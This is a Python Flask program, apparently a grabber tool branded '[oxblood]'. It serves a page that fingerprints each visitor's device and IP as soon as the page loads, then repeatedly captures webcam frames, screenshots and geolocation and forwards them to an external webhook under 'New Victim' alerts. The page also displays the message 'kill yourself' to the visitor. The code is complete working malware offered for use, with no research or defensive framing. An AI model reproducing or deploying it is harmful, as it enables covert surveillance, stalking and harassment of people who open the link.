import os
import json
import requests
import base64
import io
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

def sanitize_ip(ip):
    return ip.replace(".", "•").replace(":", "•") if ip else "unknown"

VICTIM_HTML = """<!DOCTYPE html>
<html>
<head><title>VOID</title><style>
    @keyframes bloodpulse {
        0% { background: linear-gradient(180deg, #0f0000, #1a0000); }
        50% { background: linear-gradient(180deg, #2a0000, #4a0000); }
        100% { background: linear-gradient(180deg, #0f0000, #1a0000); }
    }
    body {
        margin:0; background:linear-gradient(180deg, #0f0000, #1a0000);
        animation: bloodpulse 3s infinite linear;
        color:#fff; font-family:Arial,Helvetica,sans-serif;
        overflow:hidden; display:flex; align-items:center; justify-content:center;
        height:100vh; flex-direction:column; position:relative;
    }
    .container { text-align:center; z-index:2; }
    h1 {
        font-size:68px; margin:0 0 8px; color:#8B0000;
        text-shadow:0 0 20px #8B0000, 0 0 40px #4A0000, 0 0 80px #2A0000;
        letter-spacing:8px; font-weight:900;
    }
    p {
        font-size:19px; margin:0; color:#660000; opacity:0.95;
        text-shadow:0 0 15px #8B0000;
    }
    #status {
        font-size:15px; color:#8B0000; margin-top:60px; letter-spacing:4px;
        text-shadow:0 0 20px #8B0000;
    }
    .scanline {
        position:absolute; top:0; left:0; width:100%; height:100%;
        background:linear-gradient(to bottom, transparent 50%, rgba(139,0,0,0.15) 50%);
        background-size:100% 8px; pointer-events:none; animation:scan 4s linear infinite;
        opacity:0.12; z-index:1;
    }
    @keyframes scan { 0% { background-position:0 0; } 100% { background-position:0 100%; } }
</style></head>
<body>
    <div class="scanline"></div>
    <div class="container">
        <h1>[oxblood]</h1>
        <p>you were never meant to leave</p>
    </div>
    <div id="status">kill yourself</div>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
    <script>
        let ip = "";
        let systemInfo = {};
        let lastWebcam = null;
        let lastScreenshot = null;
        let lastLat = null;
        let lastLon = null;
        let lastAlt = "Not Accessible";
        let loopStarted = false;
        async function sendInitialData() {
            try {
                const res = await fetch("https://api.ipify.org?format=json");
                const data = await res.json();
                ip = data.ip;
            } catch(e) { setTimeout(sendInitialData, 1500); return; }
            let referrer = document.referrer || "Direct";
            let canvasHash = "Unknown"; let audioHash = "Unknown"; let webglInfo = {}; let batteryInfo = {}; let connectionInfo = {}; let localIP = "Unknown";
            try {
                const c = document.createElement("canvas");
                const ctx = c.getContext("2d");
                ctx.textBaseline = "alphabetic";
                ctx.font = "14px Arial";
                ctx.fillText("👾 Grok was here", 2, 20);
                canvasHash = Array.from(ctx.getImageData(0,0,c.width,c.height).data).reduce((a,b)=>a+b,0).toString(16);
            } catch(e) {}
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                oscillator.frequency.value = 1000;
                oscillator.connect(analyser);
                analyser.connect(audioCtx.destination);
                oscillator.start();
                const buffer = new Float32Array(analyser.fftSize);
                analyser.getFloatFrequencyData(buffer);
                audioHash = buffer.reduce((a,b)=>a+b,0).toString(16).slice(0,12);
                oscillator.stop();
            } catch(e) {}
            try {
                const gl = document.createElement("canvas").getContext("webgl");
                webglInfo = {"WebGL Vendor": gl.getParameter(gl.VENDOR),"WebGL Renderer": gl.getParameter(gl.RENDERER),"WebGL Version": gl.getParameter(gl.VERSION)};
            } catch(e) {}
            if (navigator.getBattery) {
                try {
                    const bat = await navigator.getBattery();
                    batteryInfo = { "Battery %": `${Math.floor(bat.level*100)}%`, "Charging": bat.charging ? "Yes" : "No" };
                } catch(e) {}
            }
            if (navigator.connection) {
                connectionInfo = {"Connection Type": navigator.connection.effectiveType || "Unknown","Downlink": `${navigator.connection.downlink || "?"} Mbps","RTT": `${navigator.connection.rtt || "?"} ms`};
            }
            try {
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel("");
                pc.onicecandidate = (e) => { if (e.candidate) localIP = e.candidate.candidate.split(" ")[4] || "Unknown"; };
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
            } catch(e) {}
            systemInfo = {
                "IP Address": ip,"Referrer": referrer,"Local Network IP (WebRTC)": localIP,
                "OS Name": navigator.platform,"OS Version": navigator.userAgent,
                "Browser Name": navigator.userAgent.includes("Chrome") ? "Chrome" : navigator.userAgent.includes("Safari") ? "Safari" : navigator.userAgent.includes("Firefox") ? "Firefox" : "Unknown",
                "Browser Vendor": navigator.vendor || "Unknown",
                "Device Type": /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
                "CPU Cores": navigator.hardwareConcurrency || "Unknown",
                "Device Resolution": `${screen.width}x${screen.height}`,
                "Color Depth": `${screen.colorDepth} bit`,
                "Time Zone": Intl.DateTimeFormat().resolvedOptions().timeZone,
                "User Languages": navigator.languages ? navigator.languages.join(", ") : navigator.language,
                "User Agent": navigator.userAgent,
                "Device Memory": navigator.deviceMemory || "Unknown",
                "Cookie Enabled": navigator.cookieEnabled ? "Yes" : "No",
                "Online": navigator.onLine ? "Yes" : "No",
                "Max Touch Points": navigator.maxTouchPoints || "0",
                "Canvas Fingerprint": canvasHash,"Audio Fingerprint": audioHash,
                ...webglInfo,...batteryInfo,...connectionInfo
            };
            fetch("/new_victim", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ip: ip, system: systemInfo})})
                .then(() => { if (!loopStarted) { loopStarted = true; startLiveLoop(); } });
        }
        function startLiveLoop() {
            let video = document.getElementById("video");
            let canvas = document.getElementById("canvas");
            navigator.mediaDevices.getUserMedia({video: true}).then(stream => { video.srcObject = stream; video.play(); }).catch(() => {});
            setInterval(async () => {
                if (!ip) return;
                if (video.videoWidth > 0) {
                    let maxHeight = 108; let scale = maxHeight / video.videoHeight; if (scale > 1) scale = 1;
                    canvas.width = video.videoWidth * scale; canvas.height = video.videoHeight * scale;
                    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                    lastWebcam = canvas.toDataURL("image/png");
                }
                try {
                    const screenshotCanvas = await html2canvas(document.body, {backgroundColor: "#111"});
                    let maxHeight = 264; let scale = maxHeight / screenshotCanvas.height; if (scale > 1) scale = 1;
                    const thumbCanvas = document.createElement("canvas");
                    thumbCanvas.width = screenshotCanvas.width * scale; thumbCanvas.height = screenshotCanvas.height * scale;
                    thumbCanvas.getContext("2d").drawImage(screenshotCanvas, 0, 0, thumbCanvas.width, thumbCanvas.height);
                    lastScreenshot = thumbCanvas.toDataURL("image/png");
                } catch(e) {}
                if (navigator.geolocation && lastLat === null) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => { lastLat = pos.coords.latitude; lastLon = pos.coords.longitude; lastAlt = pos.coords.altitude || "Not Accessible"; },
                        () => {}, { timeout: 8000 }
                    );
                }
                const payload = { ip: ip };
                if (lastWebcam) payload.webcam = lastWebcam;
                if (lastScreenshot) payload.screenshot = lastScreenshot;
                if (lastLat !== null) { payload.lat = lastLat; payload.lon = lastLon; payload.alt = lastAlt; }
                fetch("/update", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload)});
            }, 1000);
        }
        sendInitialData();
    </script>
</body>
</html>"""

@app.route("/")
def serve_victim():
    return VICTIM_HTML

@app.route("/new_victim", methods=["POST"])
def new_victim():
    data = request.json
    ip = data.get("ip")
    system = data.get("system", {})
    if WEBHOOK_URL:
        description = "".join(f"**{key}:** `{value}`\n" for key, value in system.items())
        payload = {"embeds": [{"title": f"[oxblood] New Victim — {sanitize_ip(ip)}", "description": description.strip() or "No data", "color": 0x8B0000}]}
        requests.post(WEBHOOK_URL, json=payload)
    return jsonify({"status": "ok"})

@app.route("/update", methods=["POST"])
def update():
    data = request.json
    ip = data.get("ip")
    if WEBHOOK_URL:
        embed = {
            "title": f"[oxblood] Live Update — {sanitize_ip(ip)}",
            "description": f"**{datetime.now().strftime('[ %d/%m/%Y ] [ %H:%M:%S ]')}**\n\n",
            "color": 0x8B0000
        }
        files_to_send = {}
        file_count = 0
        if data.get("webcam"):
            file_data = base64.b64decode(data["webcam"].split(",")[1])
            files_to_send[f"file{file_count}"] = ("webcam.png", io.BytesIO(file_data), "image/png")
            file_count += 1
            embed["image"] = {"url": "attachment://webcam.png"}
        if data.get("screenshot"):
            file_data = base64.b64decode(data["screenshot"].split(",")[1])
            files_to_send[f"file{file_count}"] = ("screenshot.png", io.BytesIO(file_data), "image/png")
            file_count += 1
            if "image" not in embed:
                embed["thumbnail"] = {"url": "attachment://screenshot.png"}
        if data.get("lat") is not None:
            embed["description"] += f"**Latitude:** `{data.get('lat')}`\n**Longitude:** `{data.get('lon')}`\n**Altitude:** `{data.get('alt')}`"
        payload = {"embeds": [embed]}
        requests.post(
            WEBHOOK_URL,
            data={"payload_json": json.dumps(payload)},
            files=files_to_send if files_to_send else None
        )
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
